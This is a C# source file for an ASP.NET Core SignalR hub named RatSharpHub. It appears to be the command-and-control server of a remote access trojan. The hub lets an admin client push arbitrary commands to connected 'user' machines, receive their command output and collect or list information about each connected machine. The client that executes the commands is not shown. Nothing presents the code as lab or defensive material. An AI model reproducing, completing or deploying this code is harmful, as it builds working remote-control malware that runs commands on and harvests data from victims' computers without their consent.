using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using Microsoft.AspNetCore.SignalR;
using OneOf;
using OneOf.Types;

namespace Server.Hubs;

public class RatSharpHub : Hub<IRatSharpClient>
{
  #region Overrides

  public override async Task OnDisconnectedAsync(Exception? exception)
  {
    UserRepository.RemoveIfExists(Context.ConnectionId);
    await base.OnDisconnectedAsync(exception);
  }

  #endregion

  #region Hub methods invoked by AdminClient

  /// <summary>
  /// AdminClient invokes this hub method to identify itself as admin so that UserClients know which connected client
  /// is the admin
  /// </summary>
  public async Task IdentifyAsAdmin()
  {
    await Groups.AddToGroupAsync(Context.ConnectionId, "Admin");
  }

  /// <summary>
  /// AdminClient invokes this hub method to send an execute command request to a connected UserClient
  /// </summary>
  /// <param name="userId">Id of the connected UserClient that will execute the command</param>
  /// <param name="command">The command to execute</param>
  public async Task SendExecuteCommandRequest(string userId, string command)
  {
    await Clients.Client(userId).ReceiveExecuteCommandRequest(command);
  }

  /// <summary>
  /// AdminClient invokes this hub method to get the detailed information of a connected UserClient
  /// </summary>
  /// <param name="userId">Id of the connected UserClient</param>
  public async Task GetUserInfo(string userId)
  {
    OneOf<string, None> result = UserRepository.TryGetUserInfo(userId);
    await result.Match<Task>(
      async (userInfo) => { await Clients.Caller.ReceiveGetUserResponse(userInfo); },
      async (_) => { await Clients.Caller.ReceiveUserNotFoundResponse(); });
  }

  public async Task GetAllUsersInfo()
  {
    IEnumerable<string> allUsersInfo = UserRepository.GetAllUsersInfo();
    await Clients.Caller.ReceiveGetAllUsersResponse(allUsersInfo);
  }

  #endregion

  #region Hub methods invoked by UserClient(s)

  public void IdentifyAsUser(string userInfo)
  {
    UserRepository.AddOrUpdate(Context.ConnectionId, userInfo);
  }

  public async Task SendExecuteCommandResponse(string commandOutput)
  {
    await Clients.Group("Admin").ReceiveExecuteCommandResponse(Context.ConnectionId, commandOutput);
  }

  #endregion
}

/// <summary>
/// Represents the event handlers of RatSharpHub clients
/// </summary>
public interface IRatSharpClient
{
  #region AdminClient handlers

  /// <summary>
  /// An event that will be triggered on AdminClient when it receives a command output from a UserClient
  /// </summary>
  /// <param name="userId">Id of the UserClient</param>
  /// <param name="commandOutput">Output of the executed command</param>
  /// <returns>A Task that will be completed when the signal is sent to the AdminClient</returns>
  public Task ReceiveExecuteCommandResponse(string userId, string commandOutput);

  /// <summary>
  /// An event that will be triggered on AdminClient when it receives the user info it requested
  /// </summary>
  /// <param name="userInfo">Detailed information of the requested UserClient</param>
  /// <returns>A Task that will be completed when the signal is sent to the AdminClient</returns>
  public Task ReceiveGetUserResponse(string userInfo);

  /// <summary>
  /// An event that will be triggered on AdminClient if the user it requested is not connected at the time of request
  /// </summary>
  /// <returns>A Task that will be completed when the signal is sent to the AdminClient</returns>
  public Task ReceiveUserNotFoundResponse();

  /// <summary>
  /// An event that will be triggered on AdminClient when it receives the info of all connected users
  /// </summary>
  /// <param name="allUsersInfo">Detailed information on all connected UserClients</param>
  /// <returns>A Task that will be completed when the signal is sent to the AdminClient</returns>
  public Task ReceiveGetAllUsersResponse(IEnumerable<string> allUsersInfo);

  #endregion

  #region UserClient handlers

  /// <summary>
  /// An event that will be triggered on UserClient when it receives an execute command request from AdminClient
  /// </summary>
  /// <param name="command">The command to execute</param>
  /// <returns>A Task that will be completed when the signal is sent to the UserClient</returns>
  public Task ReceiveExecuteCommandRequest(string command);

  #endregion
}